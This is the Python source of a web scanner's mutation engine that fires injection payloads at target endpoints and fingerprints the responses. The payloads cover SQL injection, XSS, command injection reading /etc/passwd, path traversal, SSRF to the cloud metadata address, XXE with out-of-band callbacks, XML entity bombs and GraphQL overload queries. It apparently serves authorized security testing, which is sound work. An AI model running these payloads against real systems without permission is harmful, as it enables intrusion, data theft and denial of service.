"""ENGINE 1: Coverage-Guided Input Mutation (FULL).

Grammar-aware mutations for JSON, GraphQL, XML/SOAP, headers, multipart.
Tracks response fingerprints (status, timing, length, error class, structure hash)
to identify NEW_BEHAVIOR and prioritize unexplored mutations.
"""
import time
import json
import hashlib
import threading
import re
from urllib.parse import urlencode, quote, urlparse, parse_qs
from core.logger import log
from core.utils import req_lib, REQUESTS_AVAILABLE
from scanner.state import scan_state, LOCK
from scanner.findings import add_finding

# ── Response fingerprinting ────────────────────────────────────────────────────

def _timing_bucket(elapsed_ms):
    if elapsed_ms < 10: return '<10ms'
    elif elapsed_ms < 100: return '<100ms'
    elif elapsed_ms < 500: return '<500ms'
    elif elapsed_ms < 2000: return '<2000ms'
    return '>2000ms'

def _length_bucket(length):
    if length < 100: return 'tiny'
    elif length < 1000: return 'small'
    elif length < 10000: return 'medium'
    elif length < 100000: return 'large'
    return 'huge'

def _structure_hash(body):
    """Hash the structural skeleton of the response (tags, keys, patterns) ignoring values."""
    if not body:
        return 'empty'
    skeleton = re.sub(r'[0-9]+', 'N', body)
    skeleton = re.sub(r'[a-f0-9]{16,}', 'HEX', skeleton)
    skeleton = re.sub(r'\s+', ' ', skeleton)[:2000]
    return hashlib.md5(skeleton.encode()).hexdigest()[:12]

def _fingerprint_response(status, elapsed_ms, length, body):
    """Create a behavioral fingerprint: status|timing|length|error|structure."""
    body_lower = (body or '').lower()[:2000]
    error_class = 'none'
    for marker in ['exception', 'traceback', 'stack trace', 'error in', 'fatal',
                   'syntax error', 'undefined', 'nullpointer', 'sql state',
                   'internal server error', '502 bad gateway']:
        if marker in body_lower:
            error_class = 'error'
            break
    has_reflection = any(m in body_lower for m in ['<script', 'alert(', 'onerror', 'onload'])
    struct = _structure_hash(body or '')
    return f'{status}|{_timing_bucket(elapsed_ms)}|{_length_bucket(length)}|{error_class}|refl={has_reflection}|{struct}'

# ── JSON mutations ─────────────────────────────────────────────────────────────

def _json_mutations(param_name, base_value):
    mutations = []
    v = base_value or ''
    mutations.append(('string_to_int', {param_name: 999999999}))
    mutations.append(('string_to_float', {param_name: 1e1000}))
    mutations.append(('string_to_neg_float', {param_name: -1e1000}))
    mutations.append(('string_to_negative', {param_name: -1}))
    mutations.append(('string_to_zero', {param_name: 0}))
    mutations.append(('string_to_bool_true', {param_name: True}))
    mutations.append(('string_to_bool_false', {param_name: False}))
    mutations.append(('string_to_null', {param_name: None}))
    mutations.append(('string_to_array', {param_name: [v]}))
    mutations.append(('string_to_object', {param_name: {'nested': v}}))
    for depth in [10, 20, 50]:
        nested = v
        for _ in range(depth):
            nested = {'inner': nested}
        mutations.append((f'depth_{depth}', {param_name: nested}))
    mutations.append(('dup_key', f'{{"{param_name}": "{v}", "{param_name}": "OVERWRITTEN"}}'))
    mutations.append(('max_int', {param_name: 2**63 - 1}))
    mutations.append(('min_int', {param_name: -(2**63)}))
    mutations.append(('float_nan', {param_name: 'NaN'}))
    mutations.append(('float_inf', {param_name: 'Infinity'}))
    mutations.append(('unicode_ctrl', {param_name: v + '\u0000\u0001\u0002'}))
    mutations.append(('empty_string', {param_name: ''}))
    mutations.append(('whitespace', {param_name: '   '}))
    mutations.append(('newline', {param_name: '\n\r\n'}))
    mutations.append(('array_10k', {param_name: list(range(10000))}))
    mutations.append(('deep_array', {param_name: [[[[[v]]]] * 10] * 10}))
    return mutations

# ── GraphQL mutations ──────────────────────────────────────────────────────────

def _graphql_introspection():
    return [
        ('introspection_full', '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name } } } } } }"}'),
        ('introspection_types', '{"query":"{ __type(name: \\"User\\") { name fields { name type { name } } } }"}'),
        ('introspection_dirs', '{"query":"{ __schema { directives { name locations args { name type { name } } } } }"}'),
    ]

def _graphql_alias_overload(base_query='query { viewer { id name } }'):
    aliases = []
    for n in [10, 50, 100]:
        parts = []
        for i in range(n):
            parts.append(f'alias{i}: viewer {{ id name }}')
        q = '{ ' + ' '.join(parts) + ' }'
        aliases.append((f'alias_{n}', json.dumps({'query': q})))
    return aliases

def _graphql_depth_amplification():
    payloads = []
    for depth in [10, 20, 50]:
        q = 'query { ' + 'viewer { ' * depth + 'id' + ' } ' * depth + '}'
        payloads.append((f'depth_{depth}', json.dumps({'query': q})))
    return payloads

def _graphql_batched(batch_size=50):
    queries = []
    for i in range(batch_size):
        queries.append({'query': '{ viewer { id } }'})
    return [('batched_' + str(batch_size), json.dumps(queries))]

def _graphql_fragment_circular():
    return [
        ('fragment_cycle', json.dumps({'query': 'query { ...A } fragment A on User { ...B } fragment B on User { ...A }'})),
        ('fragment_deep', json.dumps({'query': 'query { ...F1 } fragment F1 on User { ...F2 } fragment F2 on User { ...F3 } fragment F3 on User { ...F4 } fragment F4 on User { id name }'})),
    ]

def _graphql_mutations(param_name='query'):
    mutations = []
    mutations.extend(_graphql_introspection())
    mutations.extend(_graphql_alias_overload())
    mutations.extend(_graphql_depth_amplification())
    mutations.extend(_graphql_batched())
    mutations.extend(_graphql_fragment_circular())
    # Type confusion
    mutations.append(('int_as_query', {param_name: 12345}))
    mutations.append(('bool_as_query', {param_name: True}))
    mutations.append(('null_as_query', {param_name: None}))
    mutations.append(('array_as_query', {param_name: ['query { viewer { id } }']}))
    return mutations

# ── Header mutations ───────────────────────────────────────────────────────────

def _header_mutations(param_name, base_value):
    mutations = []
    v = base_value or ''
    mutations.append(('crlf_in_value', {param_name: v + '%0d%0aInjected-Header: malicious'}))
    mutations.append(('crlf_raw', {param_name: v + '\r\nInjected-Header: malicious'}))
    mutations.append(('null_byte', {param_name: v + '%00'}))
    mutations.append(('duplicate_header', {param_name: [v, 'OVERRIDDEN']}))
    mutations.append(('uppercase', {param_name: v.upper() if v else v}))
    mutations.append(('lowercase', {param_name: v.lower() if v else v}))
    mutations.append(('tab_smuggle', {param_name: v + '\tX-Injected: true'}))
    mutations.append(('line_fold', {param_name: v + '\r\n\tFolded-Header: value'}))
    return mutations

# ── URL parameter mutations ────────────────────────────────────────────────────

def _url_param_mutations(param_name, base_value):
    mutations = []
    v = base_value or ''
    sql_payloads = ["'", "1' OR '1'='1", "1; DROP TABLE--", "' UNION SELECT NULL--",
                    "1' AND SLEEP(5)--", "1' WAITFOR DELAY '0:0:5'--"]
    for p in sql_payloads:
        mutations.append(('sqli', {param_name: v + p}))
    xss_payloads = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>',
                    "';alert(1)//", '<svg/onload=alert(1)>', '"><details open/ontoggle=alert(1)>']
    for p in xss_payloads:
        mutations.append(('xss', {param_name: p}))
    mutations.append(('path_traversal', {param_name: '../../../../etc/passwd'}))
    mutations.append(('path_traversal_encoded', {param_name: '..%2f..%2f..%2fetc%2fpasswd'}))
    mutations.append(('path_traversal_double', {param_name: '..%252f..%252f..%252fetc%252fpasswd'}))
    cmd_payloads = ['; id', '| id', '$(id)', '`id`', '; cat /etc/passwd']
    for p in cmd_payloads:
        mutations.append(('cmdi', {param_name: v + p}))
    mutations.append(('ssrf_localhost', {param_name: 'http://127.0.0.1'}))
    mutations.append(('ssrf_metadata', {param_name: 'http://169.254.169.254/latest/meta-data/'}))
    mutations.append(('ssrf_gopher', {param_name: 'gopher://127.0.0.1:80/_GET / HTTP/1.1'}))
    mutations.append(('ssrf_dict', {param_name: 'dict://127.0.0.1:6379/info'}))
    mutations.append(('empty', {param_name: ''}))
    mutations.append(('negative', {param_name: '-1'}))
    mutations.append(('large_number', {param_name: '999999999999'}))
    mutations.append(('float', {param_name: '3.14159'}))
    mutations.append(('boolean_true', {param_name: 'true'}))
    mutations.append(('boolean_false', {param_name: 'false'}))
    mutations.append(('null', {param_name: 'null'}))
    mutations.append(('undefined', {param_name: 'undefined'}))
    mutations.append(('array', {param_name: '[1,2,3]'}))
    mutations.append(('object', {param_name: '{"key":"value"}'}))
    mutations.append(('unicode_overlong', {param_name: '%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'}))
    mutations.append(('backslash', {param_name: '..\\..\\..\\windows\\system32'}))
    return mutations

# ── XML/SOAP mutations ─────────────────────────────────────────────────────────

def _xml_mutations(data):
    mutations = []
    mutations.append(('xxe_file', {'_xml_body': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'}))
    mutations.append(('xxe_ssrf', {'_xml_body': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'}))
    mutations.append(('xxe_oob', {'_xml_body': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://OOB_TOKEN.oast.pro/xxe"> %xxe;]><root>&xxe;</root>'}))
    mutations.append(('billion_laughs', {'_xml_body': '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol2;</root>'}))
    mutations.append(('quadratic_bomb', {'_xml_body': '<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]><data>&b;</data>'}))
    mutations.append(('entity_expansion', {'_xml_body': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/null"><!ENTITY clone SYSTEM "file:///dev/urandom">]><root>&clone;</root>'}))
    # Deep nesting
    depth_xml = '<root>' + '<child>' * 100 + 'payload' + '</child>' * 100 + '</root>'
    mutations.append(('deep_nesting_100', {'_xml_body': depth_xml}))
    depth_xml2 = '<root>' + '<child>' * 500 + 'payload' + '</child>' * 500 + '</root>'
    mutations.append(('deep_nesting_500', {'_xml_body': depth_xml2}))
    # Encoding confusion
    mutations.append(('utf16_bom', {'_xml_body': '\xff\xfe\x00\x00<?xml version="1.0"?><root>payload</root>'}))
    mutations.append(('utf7_xxe', {'_xml_body': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "addJyIvZXRjL3Bhc3N3ZCI">]><root>&xxe;</root>'}))
    # CDATA injection
    mutations.append(('cdata_inject', {'_xml_body': '<?xml version="1.0"?><root><![CDATA[<script>alert(1)</script>]]></root>'}))
    return mutations

# ── Multipart mutations ────────────────────────────────────────────────────────

def _multipart_mutations(form_data):
    mutations = []
    # Boundary confusion
    mutations.append(('no_boundary', {'_multipart_raw': 'Content-Type: text/plain\r\n\r\npayload'}))
    mutations.append(('double_boundary', {'_multipart_raw': '------WebKitFormBoundary----WebKitFormBoundary\r\n\r\npayload'}))
    mutations.append(('empty_boundary', {'_multipart_raw': '\r\n\r\npayload'}))
    # Parameter pollution
    if form_data:
        for key in form_data:
            mutations.append(('param_pollution', {key: [form_data[key], 'OVERRIDDEN_VALUE']}))
    # Missing Content-Disposition
    mutations.append(('no_disp', {'_multipart_raw': 'Content-Type: text/plain\r\n\r\npayload'}))
    # Nested multipart
    nested = ('------InnerBoundary\r\n'
              'Content-Disposition: form-data; name="inner"\r\n'
              'Content-Type: multipart/mixed; boundary=InnerBoundary\r\n\r\n'
              '------InnerBoundary\r\n'
              'Content-Disposition: form-data; name="file"; filename="test.txt"\r\n'
              'Content-Type: text/plain\r\n\r\n'
              'nested content\r\n'
              '------InnerBoundary--\r\n'
              '------OuterBoundary--')
    mutations.append(('nested_multipart', {'_multipart_raw': nested}))
    # Binary in filename
    mutations.append(('binary_filename', {'_multipart_raw': 'Content-Disposition: form-data; name="file"; filename="\x00test.php"\r\nContent-Type: text/plain\r\n\r\npayload'}))
    # Oversized field name
    mutations.append(('long_fieldname', {'_multipart_raw': f'Content-Disposition: form-data; name="{"A"*10000}"\r\n\r\npayload'}))
    return mutations

# ── Engine core ────────────────────────────────────────────────────────────────

class MutationEngine:
    """Coverage-guided input mutation engine (FULL)."""

    def __init__(self, target, max_mutations_per_param=100, max_requests=10000):
        self.target = target
        self.max_mutations_per_param = max_mutations_per_param
        self.max_requests = max_requests
        self.coverage = set()
        self.new_behaviors = []
        self.request_count = 0
        self.findings = []
        self._lock = threading.Lock()

    def _check_kill_switch(self):
        from scanner.limits import KillSwitch
        ks = KillSwitch(scan_state.get('scan_id', ''))
        return ks.check()

    def _send_mutation(self, url, method, params, headers=None, timeout=10):
        if not REQUESTS_AVAILABLE or not req_lib:
            return None
        if self.request_count >= self.max_requests:
            return None
        if self._check_kill_switch():
            return None
        try:
            start = time.time()
            hdrs = headers or {}
            if method.upper() == 'GET':
                resp = req_lib.get(url, params=params, headers=hdrs, timeout=timeout, verify=False)
            elif method.upper() == 'POST':
                if isinstance(params, dict) and '_xml_body' in params:
                    resp = req_lib.post(url, data=params['_xml_body'],
                                        headers={**hdrs, 'Content-Type': 'application/xml'},
                                        timeout=timeout, verify=False)
                elif isinstance(params, dict) and '_multipart_raw' in params:
                    resp = req_lib.post(url, data=params['_multipart_raw'],
                                        headers={**hdrs, 'Content-Type': 'multipart/form-data'},
                                        timeout=timeout, verify=False)
                elif isinstance(params, str):
                    resp = req_lib.post(url, data=params, headers=hdrs, timeout=timeout, verify=False)
                else:
                    resp = req_lib.post(url, json=params, headers=hdrs, timeout=timeout, verify=False)
            elif method.upper() == 'PUT':
                resp = req_lib.put(url, json=params, headers=hdrs, timeout=timeout, verify=False)
            elif method.upper() == 'DELETE':
                resp = req_lib.delete(url, headers=hdrs, timeout=timeout, verify=False)
            else:
                resp = req_lib.request(method, url, params=params, headers=hdrs, timeout=timeout, verify=False)
            elapsed_ms = (time.time() - start) * 1000
            body = resp.text[:100000] if resp.text else ''
            fp = _fingerprint_response(resp.status_code, elapsed_ms, len(body), body)
            with self._lock:
                self.request_count += 1
            return {
                'status': resp.status_code, 'length': len(body), 'elapsed_ms': elapsed_ms,
                'body': body, 'fingerprint': fp, 'headers': dict(resp.headers),
                'new_behavior': fp not in self.coverage,
            }
        except Exception:
            with self._lock:
                self.request_count += 1
            return None

    def _classify_response(self, result, mutation_type, param_name):
        if not result:
            return []
        findings = []
        body = result.get('body', '')
        body_lower = body.lower()
        status = result.get('status', 0)
        if mutation_type.startswith('sqli'):
            for ind in ['sql syntax', 'mysql', 'sqlite', 'postgresql', 'ora-', 'sqlstate', 'unquoted series']:
                if ind in body_lower:
                    findings.append({'type': 'sqli', 'param': param_name, 'severity': 'critical', 'evidence': body[:500], 'status': status})
                    break
        if mutation_type.startswith('xss'):
            if '<script>' in body_lower or 'alert(' in body_lower or 'onerror=' in body_lower:
                findings.append({'type': 'xss', 'param': param_name, 'severity': 'high', 'evidence': body[:500], 'status': status})
        if mutation_type.startswith('cmdi'):
            for ind in ['uid=', 'gid=', 'root:', '/bin/sh', 'Linux version']:
                if ind in body:
                    findings.append({'type': 'command_injection', 'param': param_name, 'severity': 'critical', 'evidence': body[:500], 'status': status})
                    break
        if mutation_type.startswith('ssrf'):
            for ind in ['ami-id', 'instance-id', 'security-credentials', 'local-ipv4', '169.254.169.254']:
                if ind in body_lower:
                    findings.append({'type': 'ssrf', 'param': param_name, 'severity': 'critical', 'evidence': body[:500], 'status': status})
                    break
        if mutation_type.startswith('xxe'):
            for ind in ['root:x:0:0', '/etc/passwd', 'daemon:', 'bin:']:
                if ind in body:
                    findings.append({'type': 'xxe', 'param': param_name, 'severity': 'critical', 'evidence': body[:500], 'status': status})
                    break
        if mutation_type.startswith('path_traversal'):
            for ind in ['root:x:0:0', '/bin/bash', '/bin/sh', 'etc/passwd']:
                if ind in body:
                    findings.append({'type': 'path_traversal', 'param': param_name, 'severity': 'high', 'evidence': body[:500], 'status': status})
                    break
        if result.get('new_behavior') and status >= 500:
            for ind in ['traceback', 'exception', 'stack trace', 'file "', 'line ', 'syntaxerror']:
                if ind in body_lower:
                    findings.append({'type': 'info_disclosure', 'param': param_name, 'severity': 'medium', 'evidence': body[:500], 'status': status})
                    break
        return findings

    def run(self, endpoints, method='GET'):
        if not REQUESTS_AVAILABLE:
            log('warn', '[MUTATION] requests library not available')
            return {'findings': [], 'coverage': 0, 'requests': 0, 'new_behaviors': []}
        log('info', f'[MUTATION] Starting against {len(endpoints)} endpoints (max {self.max_requests} requests)')
        all_findings = []
        for url, params, content_type in endpoints:
            if self.request_count >= self.max_requests:
                break
            if self._check_kill_switch():
                log('warn', '[MUTATION] Kill switch triggered')
                break
            is_graphql = 'graphql' in (content_type or '').lower() or 'graphql' in url.lower()
            if is_graphql:
                param_mutations = _graphql_mutations()
            elif 'json' in (content_type or ''):
                param_mutations = []
                for pname, pval in (params or {}).items():
                    param_mutations.extend(_json_mutations(pname, pval))
            elif 'xml' in (content_type or ''):
                param_mutations = _xml_mutations(params)
            elif 'form' in (content_type or '') or 'multipart' in (content_type or ''):
                param_mutations = _multipart_mutations(params)
            else:
                param_mutations = []
                for pname, pval in (params or {}).items():
                    param_mutations.extend(_url_param_mutations(pname, pval))
            for mut_type, mut_data in param_mutations[:self.max_mutations_per_param]:
                if self.request_count >= self.max_requests:
                    break
                result = self._send_mutation(url, method, mut_data, {}, timeout=8)
                if not result:
                    continue
                with self._lock:
                    was_new = result['fingerprint'] not in self.coverage
                    self.coverage.add(result['fingerprint'])
                    if was_new:
                        self.new_behaviors.append({
                            'url': url, 'params': list(mut_data.keys()) if isinstance(mut_data, dict) else [],
                            'fingerprint': result['fingerprint'], 'status': result['status'],
                        })
                for pname in (mut_data if isinstance(mut_data, dict) else {}):
                    if pname.startswith('_'):
                        continue
                    classified = self._classify_response(result, mut_type, pname)
                    all_findings.extend(classified)
        for f in all_findings:
            try:
                add_finding(
                    sev=f['severity'],
                    title=f'{f["type"].upper()} via input mutation on {f["param"]}',
                    sub=f'Mutation engine discovered {f["type"]}',
                    asset=self.target,
                    details=f'Evidence: {f["evidence"][:300]}\nStatus: {f["status"]}\nParameter: {f["param"]}',
                    confidence='high',
                )
            except Exception:
                pass
        log('ok', f'[MUTATION] Complete: {self.request_count} requests, {len(self.coverage)} behaviors, {len(all_findings)} findings')
        return {
            'findings': all_findings, 'coverage': len(self.coverage),
            'requests': self.request_count, 'new_behaviors': self.new_behaviors,
        }
